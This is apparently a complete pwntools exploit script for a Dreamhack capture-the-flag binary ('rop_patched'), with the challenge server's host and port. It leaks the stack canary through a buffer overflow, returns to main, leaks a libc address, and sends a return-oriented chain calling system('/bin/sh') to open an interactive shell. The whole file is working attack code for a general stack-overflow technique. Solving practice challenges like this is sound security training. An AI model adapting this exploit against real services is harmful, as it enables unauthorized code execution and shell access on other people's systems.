#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./rop_patched', checksec=False)

libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.35.so", checksec=False)

gs = """
b *main
b *main+130
b *main+204
b *main+234
"""

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)



def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('host3.dreamhack.games', 23928)
    else:
        return process(elf.path)

poprdi_ret = pack(0x0000000000400853)
ret = pack(0x0000000000400854)
padding_canary = 0x38
padding_return = 0x48
main = pack(elf.sym['main'])
io = start()


sla(b'Buf: ', b'a' * padding_canary)

io.recvuntil(b'a' * padding_canary)
canary = unpack(io.recvn(8)) - 0xa
success(f"canary @ {hex(canary)}")


return_main = b'a' * padding_canary + pack(canary) + b'a' * (padding_return - padding_canary - 8) + ret + main
sa(b'Buf: ', return_main)

padding_libc = 0xd8
leak_libc = b'a' * (padding_libc - 5) + b'LEAK:'
sa(b'Buf: ', leak_libc)

io.recvuntil(b'LEAK:')
libc.address = unpack(io.recvn(6) + b'\x00' * 2) - 0x29e40
success(f"libc @ {hex(libc.address)}")

system = pack(libc.symbols['system'])
binsh = pack(next(libc.search(b'/bin/sh\x00')))

win = b'a' * padding_canary + pack(canary) + b'a' * (padding_return - padding_canary - 8) + ret + poprdi_ret + binsh + system
sa(b'Buf: ', win)

io.interactive()